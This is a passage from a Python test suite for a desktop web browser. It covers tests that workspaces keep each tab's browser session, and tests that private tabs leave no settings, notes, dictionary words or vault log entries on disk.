    # one tab in each of: main, a virtual browser, a throwaway, a site
    # that is never restored
    _w275.sessions.append({"name": "X275", "sid": "x275"})
    _w275.sessions.append({"name": "T275", "sid": "tmp-t275"})
    br.throwaway_sessions().append("tmp-t275")
    _w275.restore_excluded = lambda u: "r275" in str(u)
    _m = _w275.new_tab(url=srv.url("/twhome?m275"), switch=False)
    _x = _w275.new_tab(url=srv.url("/twother?x275"), switch=False,
                       session="x275")
    _t = _w275.new_tab(url=srv.url("/twhome?t275"), switch=False,
                       session="tmp-t275")
    _r = _w275.new_tab(url=srv.url("/twhome?r275"), switch=False)
    H.spin(700)
    _rows275 = _w275.save_workspace("w275") or []
    _by275 = {r["u"].split("?")[-1]: r.get("s") for r in _rows275}
    check("275 a saved workspace keeps each tab's browser and leaves out "
          "throwaway and never-restore tabs",
          _by275 == {"m275": "main", "x275": "x275"}, str(_by275))
    # 275b: opening it puts each tab back in its browser; a browser that
    # is gone gets "main"; the throwaway and excluded tabs stay open
    br.config["workspaces"]["o275"] = [
        {"u": srv.url("/twhome?om275"), "t": "", "s": "main"},
        {"u": srv.url("/twother?ox275"), "t": "", "s": "x275"},
        {"u": srv.url("/twother?og275"), "t": "", "s": "gone275"}]
    _w275.open_workspace("o275", keep=True)
    H.spin(400)
    _sess275 = {m: [getattr(v, "session", "main")
                    for v in _find275(_w275, m)]
                for m in ("om275", "ox275", "og275")}
    check("275 opening a workspace reopens each tab in its own browser "
          "(a gone one in main)",
          _sess275 == {"om275": ["main"], "ox275": ["x275"],
                       "og275": ["main"]}, str(_sess275))
    check("275 opening a workspace leaves throwaway and never-restore "
          "tabs open",
          _open274(_w275, _t) and _open274(_w275, _r)
          and not _open274(_w275, _m) and not _open274(_w275, _x),
          str((_open274(_w275, _t), _open274(_w275, _r),
               _open274(_w275, _m), _open274(_w275, _x))))
    # 275c: a set that covers only "main" does not close the other browser
    _y = _w275.new_tab(url=srv.url("/twother?y275"), switch=False,
                       session="x275")
    _mm = _w275.new_tab(url=srv.url("/twhome?mm275"), switch=False)
    H.spin(500)
    br.config["workspaces"]["c275"] = [
        {"u": srv.url("/twhome?cm275"), "t": "", "s": "main"}]
    _w275.open_workspace("c275", keep=True)
    H.spin(300)
    check("275 a workspace of one browser closes only that browser's tabs",
          _open274(_w275, _y) and not _open274(_w275, _mm),
          str((_open274(_w275, _y), _open274(_w275, _mm))))
    # 275e: the automatic save of the open tabs never takes a name he gave
    _keep275 = _w275.new_tab(url=srv.url("/twhome?k275"), switch=False)
    H.spin(400)
    br.config["workspaces"] = {
        "previous tabs": [{"u": "http://mine275.example/", "t": "mine",
                           "s": "main"}],
        "t275": [{"u": srv.url("/twother?tt275"), "t": "", "s": "main"}]}
    br.config["workspaceNow"] = ""
    _w275.open_workspace("t275")
    H.spin(300)
    _ws275 = br.workspaces()
    check("275 switching sets does not overwrite a set named 'previous tabs'",
          _ws275["previous tabs"][0]["u"] == "http://mine275.example/"
          and any("k275" in r["u"] for n, rows in _ws275.items()
                  if n.startswith("previous tabs") and n != "previous tabs"
                  for r in rows), str(_ws275)[:300])
    # 275b: a second such switch writes over its own slot, no new set
    br.config["workspaceNow"] = ""
    _w275.open_workspace("t275")
    H.spin(300)
    _autos275 = sorted(n for n in br.workspaces()
                       if n.startswith("previous tabs"))
    check("275b the automatic save keeps one slot of its own",
          len(_autos275) == 2 and "previous tabs" in _autos275,
          str(_autos275))
    # 275c: getting the automatic slot back keeps what it holds
    br.config["workspaces"]["slot275"] = [
        {"u": srv.url("/twhome?slot275"), "t": "", "s": "main"}]
    br.config["workspaceAuto"] = "slot275"
    br.config["workspaceNow"] = ""
    _w275.open_workspace("slot275")
    H.spin(300)
    _slot275 = br.workspaces().get("slot275") or []
    check("275c opening the automatic slot does not write the left tabs over it",
          len(_slot275) == 1 and "slot275" in _slot275[0]["u"],
          str(_slot275)[:200])
finally:
    br.config.pop("workspaceAuto", None)
    for _k, _o in _cfg274.items():
        if _o == "__absent__":
            br.config.pop(_k, None)
        else:
            br.config[_k] = _o
    br.throwaway_sessions()[:] = _tw274
    _w275.__dict__.pop("restore_excluded", None)
    _w275._confirm_many_tabs = lambda *a, **k: True
    _w275.close()
    H.spin(500)

# ---- 276-278: nothing from a private tab is written to disk (the 60th pass). Insert before the
# final "the suite's own window stayed" check. ----
import copy as _copy60

H.Handler.pages["/t276"] = ("<title>t276</title><p id=p>Meeting on "
                            "2026-12-24 at 10:00 sharp</p>")
_cfg60 = _copy60.deepcopy(br.config)
_saves60 = []
_said60 = []
_snap60 = lambda: json.dumps(br.config, sort_keys=True, default=str)
_real_save60 = br.save_config
br.__dict__["save_config"] = lambda *a, **k: _saves60.append(1)
br.__dict__["flash"] = lambda text, *a, **k: _said60.append(str(text))
_rg60 = B.QInputDialog.getText
_rm60 = B.QInputDialog.getMultiLineText
_words60 = B.CONFIG_FILE.parent / "my-words.txt"
_words60_was = _words60.read_bytes() if _words60.exists() else None


def _priv60(path="/t276"):
    v = br.new_tab(private=True)
    H.spin(300)
    H.load(v, srv.url(path))
    H.spin(500)
    br.tabs.setCurrentWidget(v)
    H.spin(100)
    return v


def _norm60(path="/t276"):
    v = br.new_tab()
    H.spin(300)
    H.load(v, srv.url(path))
    H.spin(500)
    return v


_open60 = []
try:
    # ---- 276: per-site settings chosen in a private tab ----
    _p = _priv60(); _open60.append(_p)
    _n = _norm60(); _open60.append(_n)
    _host60 = br._host_of(_p.url())
    _keys60 = ("siteStyles", "audioSinks", "cloudSites", "autoSubmitSites",
               "fillOnLoadSites", "pasteSites", "autocompleteSites",
               "translateRules")
    _was60 = {k: json.dumps(br.config.get(k), sort_keys=True)
              for k in _keys60}
    _same60 = lambda: all(json.dumps(br.config.get(k), sort_keys=True)
                          == _was60[k] for k in _keys60)

    # the site style editor: kept in memory, shown in the private tab only
    B.QInputDialog.getMultiLineText = staticmethod(
        lambda *a, **k: ("body { outline: 3px solid red }", True))
    br.tabs.setCurrentWidget(_p)
    br.edit_site_style()
    H.spin(300)
    _mem = getattr(B, "_PRIVATE_STYLES", {})
    _on = H.wait_for(lambda: jsq(_p, "!!document.getElementById('__mycss')")
                     is True, 4000)
    br.apply_site_style(_n)
    H.spin(300)
    _leak = jsq(_n, "!!document.getElementById('__mycss')")
    check("276 a site style written in a private tab is not saved, and still "
          "styles that tab only",
          _same60() and not br.site_styles() and _host60 in _mem and _on
          and not _leak, str((_same60(), _mem, _on, _leak)))
    B.QInputDialog.getMultiLineText = _rm60

    # the audio output: the choice reaches that tab's page, not config.json
    _calls = []
    br.__dict__["media_tool2"] = lambda *a, **k: _calls.append(
        (a, k)) or True
    br.audio_output("zq-sink", view=_p)
    del _calls[:]
    _got_p = br.apply_audio_output(_p)
    _arg_p = _calls[-1][1].get("arg") if _calls else None
    del _calls[:]
    _got_n = br.apply_audio_output(_n)
    br.__dict__.pop("media_tool2", None)
    check("276 an audio output picked in a private tab is not saved, and "
          "still applies to that tab",
          _same60() and not (br.config.get("audioSinks") or {})
          and _arg_p == "zq-sink" and not _got_n,
          str((_same60(), _arg_p, _got_n)))

    # cloud gaming, remember paste / autocomplete, auto-submit, fill-on-load
    br.__dict__["gamepad"] = lambda *a, **k: None
    br.__dict__["keyboard_lock"] = lambda *a, **k: None
    _forms = []
    br.__dict__["form_tool"] = lambda name, view=None, then=None, arg=None: (
        _forms.append(name) or True)
    br.cloud_gaming(on=True, view=_p)
    _game = getattr(_p, "_game", False)
    br.allow_paste(view=_p, remember=True)
    br.override_autocomplete(view=_p, remember=True)
    _a = br.auto_submit_here(on=True, view=_p)
    _f = br.fill_on_load_here(on=True, view=_p)
    for _k in ("gamepad", "keyboard_lock", "form_tool"):
        br.__dict__.pop(_k, None)
    check("276 cloud gaming / paste / autocomplete / auto-submit / "
          "fill-on-load from a private tab save no host",
          _same60() and _game and "paste" in _forms
          and "autocompleteoff" in _forms and _a is False and _f is False
          and not _saves60, str((_same60(), _game, _forms, _a, _f,
                                 len(_saves60))))

    # the translation bar: this page is translated, no rule is written
    _tr = []
    br.__dict__["translate_page_now"] = lambda view=None, **k: _tr.append(
        view) or True
    br._trbar_act("always", "fr", _p)
    br._trbar_act("never", "nl", _p)
    _kept_p = _same60()
    br._trbar_act("never", "nl", _n)
    _kept_n = br.config.get("translateRules")
    br.__dict__.pop("translate_page_now", None)
    check("276 the translation bar's always / never from a private tab "
          "writes no rule, and always still translates the page",
          _kept_p and _tr == [_p] and (_kept_n or {}).get("nl") == "never",
          str((_kept_p, len(_tr), _kept_n)))
    br.config.pop("translateRules", None) if _was60["translateRules"] == \
        "null" else br.config.update(
            {"translateRules": json.loads(_was60["translateRules"])})

    # ---- 277: explicit "keep this" actions refused in a private tab ----
    br.config.clear(); br.config.update(_copy60.deepcopy(_cfg60))
    del _saves60[:]
    del _said60[:]

    class _Drawer60:
        def __init__(self):
            self.calls = []

        def daily_note(self):
            self.calls.append("daily_note")
            return {"id": 1}

        def append_note(self, nid, body):
            self.calls.append(("append_note", body))
            return 1

        def save_note(self, *a, **k):
            self.calls.append(("save_note", k))
            return {"id": 2}

        def add_todo(self, text, link="", due=0):
            self.calls.append(("add_todo", link))
            return []

        def add_to_collection(self, *a, **k):
            self.calls.append(("collection", a))
            return "x"

    _dr = _Drawer60()
    br.__dict__["desk"] = lambda: _dr
    _p2 = _priv60(); _open60.append(_p2)
    _n2 = _norm60(); _open60.append(_n2)
    _before = _snap60()
    _real_url = br._tab_url
    br.__dict__["media_state"] = lambda view=None, then=None: then(
        {"time": 12.0}) or True
    br.__dict__["desk_tool"] = lambda *a, **k: True
    br.__dict__["_tab_url"] = lambda v: (
        "https://www.twitch.tv/zqchannel" if v is _p2 else _real_url(v))

    # the word typed in a private tab
    B.QInputDialog.getText = staticmethod(lambda *a, **k: ("zqword", True))
    try:
        _w = br.add_to_dictionary("zqwordzq", view=_p2)
    except TypeError:      # no view= before the fix: the old call
        _w = br.add_to_dictionary("zqwordzq")
    _w_file = _words60.read_bytes() if _words60.exists() else None
    check("277 add to dictionary from a private tab keeps no word",
          _w is False and "zqwordzq" not in (br.config.get("myWords") or [])
          and _w_file == _words60_was and not _saves60,
          str((_w, _w_file, len(_saves60))))

    # the desk verbs
    br.tabs.setCurrentWidget(_p2)
    _r = [br.clip_selection(_p2), br.page_to_note(_p2),
          br.tab_to_todo(view=_p2, close=False), br.checklist_from_page(_p2),
          br.collect_page("zq", _p2), br.video_time_note(_p2),
          br.article_to_note(_p2) if hasattr(br, "article_to_note") else 0]
    B.QInputDialog.getMultiLineText = staticmethod(
        lambda *a, **k: ("a thought", True))
    br.quick_capture()
    B.QInputDialog.getMultiLineText = _rm60
    _link_in = [c for c in _dr.calls if isinstance(c, tuple)
                and c[0] == "append_note" and "http" in c[1]]
    _wrote = [c for c in _dr.calls if c not in ("daily_note",)
              and not (isinstance(c, tuple) and c[0] == "append_note"
                       and c[1] == "a thought")]
    # the same verb on a normal tab does write: the spy works
    br.page_to_note(_n2)
    _ctrl = [c for c in _dr.calls if isinstance(c, tuple)
             and c[0] == "save_note"]
    check("277 the desk verbs refuse a private tab (and quick capture leaves "
          "its address out); a normal tab still writes",
          not _wrote and not _link_in and len(_ctrl) == 1
          and _said60.count(br._ui_str("privateNotKept")) >= 6,
          str((_wrote, _link_in, len(_ctrl), len(_said60))))

    # clips, moments, watch later, live watch, keyword, all config
    br.tabs.setCurrentWidget(_p2)
    _r2 = [br.clip_mark(view=_p2), br.moment_add(view=_p2, note="n"),
           br.watch_later_add(view=_p2), br.live_add(view=_p2)]
    B.QInputDialog.getText = staticmethod(lambda *a, **k: ("zqk", True))
    _bm = json.dumps(br.bookmarks, sort_keys=True, default=str)
    _r2.append(br.ask_keyword())
    check("277 clip mark / video moment / watch later / live watch / "
          "bookmark keyword from a private tab write nothing",
          _snap60() == _before and not _saves60
          and json.dumps(br.bookmarks, sort_keys=True, default=str) == _bm
          and not any(_r2), str((_r2, len(_saves60))))

    # selection to calendar: no title and no URL line
    _ics = []
    br.__dict__["save_ics"] = lambda text="", title="", url="", path=None: (
        _ics.append((title, url, path)) or "")
    for _v in (_p2, _n2):
        br.__dict__["_tab_url"] = _real_url
        jsq(_v, "window.getSelection().selectAllChildren("
                "document.getElementById('p')); 1")
        br.selection_to_calendar(view=_v)
        H.wait_for(lambda: len(_ics) >= (1 if _v is _p2 else 2), 5000)
    br.__dict__.pop("save_ics", None)
    check("277 a calendar file made from a private tab carries no URL or "
          "page title; a normal one still does",
          len(_ics) == 2 and not _ics[0][0] and not _ics[0][1]
          and _ics[1][1].startswith("http"), str(_ics))

    # the bookmark-moved offer does not run for a private tab
    br.__dict__["_bookmark_by_id"] = lambda i: {"url": "http://old.invalid/"}
    for _v in (_p2, _n2):
        _v._from_bookmark = 7
    _mv_p = br.bookmark_moved(view=_p2)
    _mv_n = br.bookmark_moved(view=_n2)
    br.__dict__.pop("_bookmark_by_id", None)
    check("277 the bookmark-moved offer is not made for a private tab",
          _mv_p is False and bool(_mv_n), str((_mv_p, _mv_n)))
    for _k in ("desk", "media_state", "desk_tool", "_tab_url"):
        br.__dict__.pop(_k, None)

    # ---- 278: not user actions ----
    _p3 = _priv60(); _open60.append(_p3)
    _pg = _p3.page()
    _probed = []
    _real_js = _pg.runJavaScript
    _pg.runJavaScript = lambda code, *a, **k: (
        _probed.append(1) if code in (B.GPU_PROBE_JS, B.MEDIA_PROBE_JS)
        else None, _real_js(code, *a, **k))[1]
    _reports = []
    _real_gr = B.gpu_report
    B.gpu_report = lambda *a, **k: _reports.append(k) or None
    br._gpu_said = None
    br.tabs.setCurrentWidget(_p3)
    br._gpu_record()
    H.wait_for(lambda: bool(_reports), 6000)
    H.spin(300)
    B.gpu_report = _real_gr
    _pg.__dict__.pop("runJavaScript", None)
    check("278 the GPU report probes no private tab (front or not)",
          not _probed and bool(_reports), str((_probed, len(_reports))))

    class _FV60:
        def __init__(self):
            self.rows = []

        def items(self):
            return [{"id": "i1", "type": "identity"},
                    {"id": "c1", "type": "card"}]

        def reveal(self, *a):
            return "x"

        def custom_value(self, *a):
            return "x"

        def totp_view(self, *a):
            return {"code": "123456"}

        def note_access(self, item_id, field, what="revealed"):
            self.rows.append((item_id, field, what))

    _fv = _FV60()
    _real_vault = br.vault
    br.vault = _fv
    br.__dict__["vault_locked"] = lambda: False
    br.__dict__["form_tool"] = lambda name, view=None, then=None, arg=None: (
        then and then('{"filled": 1}' if name == "fillcard" else
                      "ok" if name == "otpfield" else "1"), True)[1]
    try:
        _p3b = _p3
        for _v in (_p3b, _n2):
            br.fill_identity("i1", view=_v)
            br.fill_card("c1", view=_v, cvv="123")
            br.fill_totp(view=_v, item_id="t1")
            br.fill_any_field("i1", "email", view=_v)
            if _v is _p3b:
                _priv_rows = list(_fv.rows)
        _all_rows = list(_fv.rows)
    finally:
        br.vault = _real_vault
        br.__dict__.pop("vault_locked", None)
        br.__dict__.pop("form_tool", None)
    check("278 a form fill in a private tab leaves no vault access-log "
          "row; a normal tab's still does",
          _priv_rows == [] and len(_all_rows) >= 4,
          str((_priv_rows, _all_rows)))
finally:
    for _k in ("save_config", "flash", "desk", "media_state", "desk_tool",
               "_tab_url", "media_tool2", "gamepad", "keyboard_lock",
               "form_tool", "translate_page_now", "save_ics",
               "_bookmark_by_id", "vault_locked"):
        br.__dict__.pop(_k, None)
    B.QInputDialog.getText = _rg60
    B.QInputDialog.getMultiLineText = _rm60
    br.config.clear(); br.config.update(_cfg60)
    for _t in ("_PRIVATE_STYLES", "_PRIVATE_SINKS"):
        getattr(B, _t, {}).clear()
    if _words60_was is None:
        if _words60.exists():
            _words60.unlink()
    else:
        _words60.write_bytes(_words60_was)
    for _v in _open60:
        _close_if_open(_v)

# ---- 278b: a private tab's cloud gaming box shows its own state; the GPU
# probe looks past a group header ----
_pv278b = br.new_tab(url=srv.url("/twhome?pc278b"), private=True, switch=True)
H.wait_for(lambda: "pc278b" in _pv278b.url().toString(), 8000)
_cs_was278b = list(br.config.get("cloudSites") or [])
try:
    br.cloud_gaming(on=True, view=_pv278b)
    br.tabs.setCurrentWidget(_pv278b)
    _m278b = br.play_menu(B.QMenu())
    def _acts278b(menu):
        for a in menu.actions():
            yield a
            if a.menu() is not None:
                yield from _acts278b(a.menu())
    _box278b = [a for a in _acts278b(_m278b)
                if a.text() == br._ui_str("cloudGame")]
    _on278b = bool(_box278b) and _box278b[0].isChecked()
    br.cloud_gaming(on=False, view=_pv278b)
finally:
    br.config["cloudSites"] = _cs_was278b
    _close_if_open(_pv278b)
check("278b a private tab's cloud-gaming box is ticked while it is on",
      _on278b, str((bool(_box278b), _on278b)))
import inspect as _insp278b
_g278b = _insp278b.getsource(B.Browser._gpu_record)
check("278b the GPU probe's search for a normal tab survives a group header",
      "except (AttributeError, RuntimeError):\n                        continue"
      in _g278b)

check("the suite's own window stayed on the open-window list",
      br in B.WINDOWS)

bad = [n for ok, n in RESULTS if not ok]
print("%d checks, %d failed" % (len(RESULTS), len(bad)))
for n in bad:
    print("  FAILED:", n)
sys.stdout.flush()
H.os._exit(1 if bad else 0) if hasattr(H, "os") else sys.exit(1 if bad else 0)
